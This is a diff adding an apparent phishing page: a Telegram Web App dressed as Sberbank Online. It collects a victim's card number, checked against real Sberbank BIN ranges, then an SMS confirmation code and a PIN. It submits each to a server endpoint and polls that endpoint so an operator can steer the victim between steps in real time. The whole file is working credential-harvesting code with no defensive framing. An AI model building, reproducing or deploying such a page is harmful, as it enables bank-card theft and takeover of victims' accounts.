@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Сбербанк Онлайн</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .hidden { display: none !important; }
+
+    /* ── Sberbank Header ── */
+    .sber-header {
+      background: linear-gradient(135deg, #21A038 0%, #1a8c30 100%);
+      padding: 24px 20px 28px;
+      text-align: center;
+      position: relative;
+    }
+    .sber-header::after {
+      content: '';
+      position: absolute;
+      bottom: -12px;
+      left: 0; right: 0;
+      height: 24px;
+      background: #f5f5f5;
+      border-radius: 16px 16px 0 0;
+    }
+    .sber-logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+    .sber-logo-icon {
+      width: 36px; height: 36px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .sber-logo-icon svg { width: 22px; height: 22px; }
+    .sber-header h1 {
+      color: #fff;
+      font-size: 20px;
+      font-weight: 600;
+    }
+    .sber-header p {
+      color: rgba(255,255,255,0.85);
+      font-size: 14px;
+      margin-top: 2px;
+    }
+
+    /* ── Card / Code Steps ── */
+    .step-body {
+      padding: 24px 20px 32px;
+    }
+    .step-body h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+    .step-body .subtitle {
+      color: #888;
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 16px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 16px;
+      font-size: 20px;
+      letter-spacing: 2px;
+      border: 2px solid #e0e0e0;
+      border-radius: 14px;
+      outline: none;
+      background: #fff;
+      color: #1a1a1a;
+      transition: border-color .2s;
+    }
+    .input-group input:focus {
+      border-color: #21A038;
+    }
+    .input-group input.error-border {
+      border-color: #e53935;
+    }
+    .input-group .card-icon {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 32px; height: 22px;
+      background: #21A038;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card-icon svg { width: 18px; height: 18px; }
+    .error-text {
+      color: #e53935;
+      font-size: 13px;
+      margin-top: 6px;
+      min-height: 18px;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: #21A038;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background .2s, transform .1s;
+    }
+    .btn-primary:active {
+      background: #1a8c30;
+      transform: scale(0.98);
+    }
+    .btn-primary:disabled {
+      background: #a5d6a7;
+      cursor: not-allowed;
+    }
+
+    /* ── Loading ── */
+    .loading-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #f5f5f5;
+    }
+    .spinner {
+      width: 56px; height: 56px;
+      border: 4px solid #e0e0e0;
+      border-top-color: #21A038;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-screen p {
+      color: #888;
+      font-size: 15px;
+      margin-top: 20px;
+    }
+    .loading-screen .sber-loading-logo {
+      margin-bottom: 24px;
+    }
+
+    /* ── PIN Screen (Virtual Keyboard) ── */
+    .pin-screen {
+      min-height: 100vh;
+      background:
+        linear-gradient(135deg,
+          rgba(30, 60, 20, 0.85),
+          rgba(80, 50, 10, 0.75),
+          rgba(140, 100, 20, 0.65)
+        ),
+        linear-gradient(to bottom right, #2d5016, #8b6914, #c49a2e, #3d6b22);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 48px 20px 24px;
+      position: relative;
+      overflow: hidden;
+    }
+    .pin-screen::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 20% 50%, rgba(50,80,20,0.6), transparent 60%),
+        radial-gradient(ellipse at 80% 30%, rgba(180,120,30,0.4), transparent 50%),
+        radial-gradient(ellipse at 50% 80%, rgba(60,100,30,0.5), transparent 60%);
+    }
+    .pin-content {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 360px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .pin-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 32px;
+      align-self: flex-start;
+    }
+    .pin-logo {
+      width: 44px; height: 44px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(10px);
+    }
+    .pin-logo svg { width: 26px; height: 26px; }
+    .pin-greeting {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 600;
+    }
+    .pin-label {
+      color: rgba(255,255,255,0.8);
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+    .pin-dots {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 36px;
+    }
+    .pin-dot {
+      width: 48px; height: 44px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 10px;
+      border: 1.5px solid rgba(255,255,255,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background .15s, border-color .15s;
+    }
+    .pin-dot.filled {
+      background: rgba(255,255,255,0.45);
+      border-color: rgba(255,255,255,0.6);
+    }
+    .pin-dot.filled::after {
+      content: '●';
+      color: #fff;
+      font-size: 18px;
+    }
+    .pin-error-text {
+      color: #ff6b6b;
+      font-size: 13px;
+      min-height: 18px;
+      margin-top: -28px;
+      margin-bottom: 16px;
+    }
+    .pin-keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      width: 100%;
+      max-width: 320px;
+    }
+    .pin-key {
+      height: 58px;
+      background: rgba(255,255,255,0.2);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 14px;
+      color: #1a1a1a;
+      font-size: 24px;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background .15s, transform .1s;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .pin-key:active {
+      background: rgba(255,255,255,0.4);
+      transform: scale(0.95);
+    }
+    .pin-key.cant-login {
+      background: transparent;
+      border: none;
+      backdrop-filter: none;
+      -webkit-backdrop-filter: none;
+      color: rgba(255,255,255,0.7);
+      font-size: 12px;
+      line-height: 1.3;
+      cursor: default;
+    }
+    .pin-key.backspace {
+      font-size: 20px;
+      color: #444;
+    }
+
+    /* ── Success ── */
+    .success-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #f5f5f5;
+    }
+    .success-icon {
+      width: 80px; height: 80px;
+      background: #21A038;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      animation: pop .4s ease;
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      70% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .success-icon svg { width: 40px; height: 40px; }
+    .success-screen h2 {
+      font-size: 22px;
+      color: #1a1a1a;
+      font-weight: 700;
+    }
+    .success-screen p {
+      color: #888;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+
+    /* ── Blocked ── */
+    .blocked-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #f5f5f5;
+    }
+    .blocked-icon {
+      width: 80px; height: 80px;
+      background: #e53935;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .blocked-icon span {
+      color: #fff;
+      font-size: 40px;
+      font-weight: 700;
+    }
+    .blocked-screen h2 {
+      font-size: 22px;
+      color: #1a1a1a;
+    }
+    .blocked-screen p {
+      color: #888;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ====== STEP: CARD ====== -->
+<div id="step-card" class="step hidden">
+  <div class="sber-header">
+    <div class="sber-logo-row">
+      <div class="sber-logo-icon">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <h1>Сбербанк Онлайн</h1>
+    </div>
+    <p>Авторизация</p>
+  </div>
+  <div class="step-body">
+    <h2>Введите номер карты</h2>
+    <p class="subtitle">Для входа в систему укажите номер вашей карты Сбербанка</p>
+    <div class="input-group">
+      <input type="tel" id="card-input" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#fff" stroke-width="1.5"/><line x1="2" y1="10" x2="22" y2="10" stroke="#fff" stroke-width="1.5"/></svg>
+      </div>
+    </div>
+    <div id="card-error" class="error-text"></div>
+    <button id="card-btn" class="btn-primary" disabled>Продолжить</button>
+  </div>
+</div>
+
+<!-- ====== STEP: SMS CODE ====== -->
+<div id="step-code" class="step hidden">
+  <div class="sber-header">
+    <div class="sber-logo-row">
+      <div class="sber-logo-icon">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <h1>Сбербанк Онлайн</h1>
+    </div>
+    <p>Подтверждение</p>
+  </div>
+  <div class="step-body">
+    <h2>Введите код из SMS</h2>
+    <p class="subtitle">Мы отправили код подтверждения на ваш номер телефона</p>
+    <div class="input-group">
+      <input type="tel" id="code-input" placeholder="00000" maxlength="5" autocomplete="off" inputmode="numeric">
+    </div>
+    <div id="code-error" class="error-text"></div>
+    <button id="code-btn" class="btn-primary" disabled>Подтвердить</button>
+  </div>
+</div>
+
+<!-- ====== STEP: PIN KEYBOARD ====== -->
+<div id="step-pin" class="step hidden">
+  <div class="pin-screen">
+    <div class="pin-content">
+      <div class="pin-header">
+        <div class="pin-logo">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <span class="pin-greeting">Добро пожаловать</span>
+      </div>
+      <div class="pin-label">Введите код</div>
+      <div class="pin-dots" id="pin-dots">
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+      </div>
+      <div id="pin-error" class="pin-error-text"></div>
+      <div class="pin-keyboard" id="pin-keyboard">
+        <button class="pin-key" data-key="1">1</button>
+        <button class="pin-key" data-key="2">2</button>
+        <button class="pin-key" data-key="3">3</button>
+        <button class="pin-key" data-key="4">4</button>
+        <button class="pin-key" data-key="5">5</button>
+        <button class="pin-key" data-key="6">6</button>
+        <button class="pin-key" data-key="7">7</button>
+        <button class="pin-key" data-key="8">8</button>
+        <button class="pin-key" data-key="9">9</button>
+        <div class="pin-key cant-login">Не могу<br>войти</div>
+        <button class="pin-key" data-key="0">0</button>
+        <button class="pin-key backspace" data-key="back">&#9003;</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ====== STEP: LOADING ====== -->
+<div id="step-loading" class="step hidden">
+  <div class="loading-screen">
+    <div class="sber-loading-logo">
+      <svg width="56" height="56" viewBox="0 0 56 56"><circle cx="28" cy="28" r="26" fill="none" stroke="#e0e0e0" stroke-width="3"/><circle cx="28" cy="28" r="26" fill="none" stroke="#21A038" stroke-width="3" stroke-dasharray="50 120" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 28 28" to="360 28 28" dur="0.8s" repeatCount="indefinite"/></circle><path d="M18 28l6 6L38 22" fill="none" stroke="#21A038" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <p>Пожалуйста, подождите...</p>
+  </div>
+</div>
+
+<!-- ====== STEP: SUCCESS ====== -->
+<div id="step-success" class="step hidden">
+  <div class="success-screen">
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h2>Авторизация успешна</h2>
+    <p>Добро пожаловать в Сбербанк Онлайн</p>
+  </div>
+</div>
+
+<!-- ====== STEP: BLOCKED ====== -->
+<div id="step-blocked" class="step hidden">
+  <div class="blocked-screen">
+    <div class="blocked-icon"><span>✕</span></div>
+    <h2>Доступ заблокирован</h2>
+    <p>Обратитесь в службу поддержки</p>
+  </div>
+</div>
+
+<script>
+(function() {
+  const tg = window.Telegram && window.Telegram.WebApp;
+  let initData = '';
+
+  if (tg) {
+    tg.ready();
+    tg.expand();
+    tg.setHeaderColor('#21A038');
+    tg.setBackgroundColor('#f5f5f5');
+    initData = tg.initData;
+  }
+
+  let pollTimer = null;
+  let pinValue = '';
+
+  // ── Luhn + Sber BIN validation (client-side) ──
+  function luhnCheck(num) {
+    const d = num.replace(/\s/g, '');
+    if (!/^\d{16,19}$/.test(d)) return false;
+    let s = 0, alt = false;
+    for (let i = d.length - 1; i >= 0; i--) {
+      let n = parseInt(d[i], 10);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      s += n; alt = !alt;
+    }
+    return s % 10 === 0;
+  }
+
+  function isSberCard(num) {
+    const d = num.replace(/\s/g, '');
+    if (d.length < 6) return false;
+    const b = parseInt(d.substring(0, 6), 10);
+    if (b === 427601 || b === 427604 || b === 427644) return true;
+    if (b === 427901) return true;
+    if (b >= 462729 && b <= 462750) return true;
+    if (b >= 513690 && b <= 513699) return true;
+    if (b >= 546907 && b <= 546922) return true;
+    if (b >= 220000 && b <= 220019) return true;
+    if (b === 220022) return true;
+    return false;
+  }
+
+  // ── Show step ──
+  function showStep(step, error) {
+    document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+    stopPolling();
+
+    if (step === 'card') {
+      document.getElementById('step-card').classList.remove('hidden');
+      const errEl = document.getElementById('card-error');
+      const inp = document.getElementById('card-input');
+      if (error) {
+        errEl.textContent = error;
+        inp.classList.add('error-border');
+      } else {
+        errEl.textContent = '';
+        inp.classList.remove('error-border');
+      }
+    } else if (step === 'card_pending' || step === 'code_pending' || step === 'pin_pending') {
+      document.getElementById('step-loading').classList.remove('hidden');
+      startPolling();
+    } else if (step === 'code') {
+      document.getElementById('step-code').classList.remove('hidden');
+      const errEl = document.getElementById('code-error');
+      const inp = document.getElementById('code-input');
+      if (error) {
+        errEl.textContent = error;
+        inp.classList.add('error-border');
+        inp.value = '';
+      } else {
+        errEl.textContent = '';
+        inp.classList.remove('error-border');
+      }
+      document.getElementById('code-btn').disabled = true;
+    } else if (step === 'pin') {
+      document.getElementById('step-pin').classList.remove('hidden');
+      pinValue = '';
+      updatePinDots();
+      const errEl = document.getElementById('pin-error');
+      if (error) { errEl.textContent = error; }
+      else { errEl.textContent = ''; }
+    } else if (step === 'done') {
+      document.getElementById('step-success').classList.remove('hidden');
+    } else if (step === 'blocked') {
+      document.getElementById('step-blocked').classList.remove('hidden');
+    }
+  }
+
+  // ── Polling ──
+  function startPolling() {
+    stopPolling();
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/app', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'status', initData })
+        });
+        const data = await res.json();
+        if (!data.step.endsWith('_pending')) {
+          showStep(data.step, data.error);
+        }
+      } catch (e) { /* retry on next tick */ }
+    }, 2000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  // ── API helpers ──
+  async function apiSubmit(type, value) {
+    const res = await fetch('/api/app', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'submit', initData, type, value })
+    });
+    return res.json();
+  }
+
+  // ── Card input formatting ──
+  const cardInput = document.getElementById('card-input');
+  const cardBtn = document.getElementById('card-btn');
+  const cardError = document.getElementById('card-error');
+
+  cardInput.addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').substring(0, 16);
+    let formatted = v.replace(/(\d{4})/g, '$1 ').trim();
+    this.value = formatted;
+    cardBtn.disabled = v.length < 16;
+    cardError.textContent = '';
+    this.classList.remove('error-border');
+  });
+
+  cardBtn.addEventListener('click', async function() {
+    const raw = cardInput.value.replace(/\s/g, '');
+    if (!luhnCheck(raw) || !isSberCard(raw)) {
+      cardError.textContent = 'Карта не верна, проверьте данные';
+      cardInput.classList.add('error-border');
+      return;
+    }
+    cardBtn.disabled = true;
+    cardBtn.textContent = 'Отправка...';
+    try {
+      const data = await apiSubmit('card', raw);
+      if (data.error && data.step === 'card') {
+        cardError.textContent = data.error;
+        cardInput.classList.add('error-border');
+        cardBtn.disabled = false;
+        cardBtn.textContent = 'Продолжить';
+      } else {
+        showStep(data.step, data.error);
+      }
+    } catch (e) {
+      cardError.textContent = 'Ошибка сети, попробуйте снова';
+      cardBtn.disabled = false;
+      cardBtn.textContent = 'Продолжить';
+    }
+  });
+
+  // ── Code input ──
+  const codeInput = document.getElementById('code-input');
+  const codeBtn = document.getElementById('code-btn');
+  const codeError = document.getElementById('code-error');
+
+  codeInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').substring(0, 5);
+    codeBtn.disabled = this.value.length < 5;
+    codeError.textContent = '';
+    this.classList.remove('error-border');
+  });
+
+  codeBtn.addEventListener('click', async function() {
+    const val = codeInput.value.trim();
+    if (!/^\d{5}$/.test(val)) {
+      codeError.textContent = 'Код должен содержать 5 цифр';
+      codeInput.classList.add('error-border');
+      return;
+    }
+    codeBtn.disabled = true;
+    codeBtn.textContent = 'Отправка...';
+    try {
+      const data = await apiSubmit('code', val);
+      if (data.error && data.step === 'code') {
+        codeError.textContent = data.error;
+        codeInput.classList.add('error-border');
+        codeBtn.disabled = false;
+        codeBtn.textContent = 'Подтвердить';
+      } else {
+        showStep(data.step, data.error);
+      }
+    } catch (e) {
+      codeError.textContent = 'Ошибка сети, попробуйте снова';
+      codeBtn.disabled = false;
+      codeBtn.textContent = 'Подтвердить';
+    }
+  });
+
+  // ── PIN keyboard ──
+  function updatePinDots() {
+    const dots = document.querySelectorAll('#pin-dots .pin-dot');
+    dots.forEach((dot, i) => {
+      dot.classList.toggle('filled', i < pinValue.length);
+    });
+  }
+
+  document.getElementById('pin-keyboard').addEventListener('click', async function(e) {
+    const btn = e.target.closest('.pin-key');
+    if (!btn || btn.classList.contains('cant-login')) return;
+
+    const key = btn.dataset.key;
+    document.getElementById('pin-error').textContent = '';
+
+    if (key === 'back') {
+      if (pinValue.length > 0) {
+        pinValue = pinValue.slice(0, -1);
+        updatePinDots();
+      }
+      return;
+    }
+
+    if (pinValue.length >= 5) return;
+    pinValue += key;
+    updatePinDots();
+
+    if (pinValue.length === 5) {
+      try {
+        const data = await apiSubmit('pin', pinValue);
+        if (data.error && data.step === 'pin') {
+          document.getElementById('pin-error').textContent = data.error;
+          pinValue = '';
+          updatePinDots();
+        } else {
+          showStep(data.step, data.error);
+        }
+      } catch (e) {
+        document.getElementById('pin-error').textContent = 'Ошибка сети';
+        pinValue = '';
+        updatePinDots();
+      }
+    }
+  });
+
+  // ── Init ──
+  async function init() {
+    showStep('card_pending', null); // show loading first
+    try {
+      const res = await fetch('/api/app', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'status', initData })
+      });
+      const data = await res.json();
+      showStep(data.step, data.error);
+    } catch (e) {
+      showStep('card', null);
+    }
+  }
+
+  init();
+})();
+</script>
+</body>
+</html>
